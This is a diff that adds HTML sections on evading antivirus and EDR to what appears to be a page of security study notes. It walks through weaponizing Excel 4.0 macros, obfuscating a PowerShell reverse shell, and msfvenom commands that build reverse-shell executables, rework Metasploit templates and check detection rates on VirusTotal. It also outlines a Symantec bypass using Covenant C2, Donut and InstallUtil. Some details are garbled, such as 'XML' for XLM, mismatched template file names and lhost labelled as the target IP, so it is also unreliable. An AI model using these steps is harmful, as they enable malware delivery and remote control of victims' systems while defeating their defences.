@@ -339,3 +339,83 @@ the remote system and store it at the specified location.</p>
     run in the system. While executing a legitimate and signed application, it looks for the required DLLs in the current location where the executable is saved and then searches in other locations.</p>
     <p>Attackers perform DLL hijacking to place a malicious DLL with a legitimate name that the application is looking for in the same directory where the executable resides. Attackers also use rundll32.exe, 
     regsvr32.exe and PowerShell to evade application whitelisting of the endpoint security solution.</p>
+
+    <h2>XLM Weaponization</h2>
+    <p>Excel Macro Language (XLM) is a type of Excel macro sheet and a part of the Microsoft Office
+    suite used to save some automated tasks that can be activated when the file is accessed.
+    Attackers weaponize Excel macro sheets to bypass endpoint protection and execute a malicious 
+    payload on the target system.</p>
+    <p><ol>
+      <ul>Initial access -> create and open Excel, right-click on the sheet name and select the 
+      insert dialog; select MS Excel 4.0 Macro from the Insert window and click OK</ul>
+      <ul>Try some basic commands to test the working of the macro sheet. Paste the commands 
+      "=exec('calc.exe')", "=HALT()" in the cells and change the name of the cell from A1 to 
+      auto_open</ul>
+      <ul>Save the file by selecting file type Macro-Enabled workbook (.xlsm) and open it again</ul>
+      <ul>The macro commands will automatically execute and trigger Calculator to open</ul>
+    </ol></p>
+    <p>XML Weaponization</p>
+    <p><ol>
+      <ul>Create a reverse shell payload using a PowerShell script</ul>
+      <ul>Use the PowerShell script obfuscator for script installation</ul>
+      <ul>Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation</ul>
+      <ul>Now, use the cmdlet invoke-expression to run the obfuscated shell payload</ul>
+      <ul>Try to insert the payload into XLM macro to bypass detection</ul>
+      <ul>If it is still detected, employ a Web Distributed Authoring and Versioning (WebDAV) share 
+      to execute the script from a mounted drive</ul>
+    </ol></p>
+    <h2>Dechaining Macros</h2>
+    <p>Attackers create VBA-based malicious codes; dechaining macros is used to evade endpoint 
+    detection and modify memory, registry and other Windows files using VBScript.</p>
+    <p><ol>
+      <ul>Spawning through ShellCOM</ul>
+      <ul>Spawning using XMLDOM</ul>
+      <ul>Spawning through WmiPrvse.exe</ul>
+      <ul>Creating Scheduled Tasks</ul>
+      <ul>Registry Modification</ul>
+      <ul>Dropping Files</ul>
+      <ul>Downloading Content</ul>
+      <ul>Embed File and Drop</ul>
+    </ol></p>
+    <h2>Clearing Memory Hooks</h2>
+    <p>Memory hooking is an approach to monitor and change the behavior of an application's
+    execution process. These hooks are placed by an EDR agent to collect information for 
+    performing behavior-based analysis. Hooks send information to the EDR agent, which is 
+    installed at a high-level privileged kernel, which helps in detecting malicious activities 
+    such as remote code execution, lateral movement and privilege escalation in real time.</p>
+
+    <h2>Bypassing Antivirus using Metasploit Templates</h2>
+    <p><ol>
+      <ul>msfvenom -p windows/shell_reverse_tcp lhost=<Target IP Address> 
+      lport=444 -f exe > /home/attacker/Windows.exe</ul>
+      <ul>Test Windows.exe with VirusTotal to analyze the file and identify the 
+      detection rate</ul>
+      <ul>To decrease the detection rate, open template.c and decrease the payload size</ul>
+      <ul>Navigate to the exe folder where the malicious payload is stored and run the following command:</ul>
+      <ul>i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe</ul>
+      <ul>Now, run the following command to generate a payload using the new template:</ul>
+      <ul>msfvenom -p windows/shell_reverse_tcp lhost=<Target IP Address> 
+      lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evastion.exe -f exe 
+      > /home/attacker/bypass.exe</ul>
+      <ul>Test bypass.exe with VirusTotal to analyze the file and identify the detection rate</ul>
+    <ul>Attackers continuously modify Metasploit templates to decrease the detetion rate and evade antivirus software</ul>
+    </ol></p>
+
+    <h2>Bypassing Symantec Endpoint Protection</h2>
+    <p>Symantec Endpoint Protection (SEP) is a cyber defense software suite with antivirus,
+    anti-malware and intrusion detection capabilities.</p>
+    <p><ol>
+      <ul>Use Covenant C2 Framework to create malicious payload or launcher</ul>
+      <ul>Use the Donut tool to transform payload into position-independent shellcode</ul>
+      <ul>Employ a custom .NET loader to run the position-independent shellcode</ul>
+      <ul>Run the loader using InstallUtil.exe as a LOLBin to execute the shellcode in the 
+      system memory to create a reverse C2 connection evading the SEP solution</ul>
+    </ol></p>
+
+    <h2>Hosting Phishing Sites on Popular Infrastructure</h2>
+    <p>Google Cloud, AWS etc.</p>
+    <h2>Passing Encoded Command</h2>
+    <p>Base64</p>
+    <h2>Fast Flux DNS Method</h2>
+    <p>The fast flux method allows attackers to change both IP address and DNS names 
+    rapidly and is typically utilized by large botnets</p>
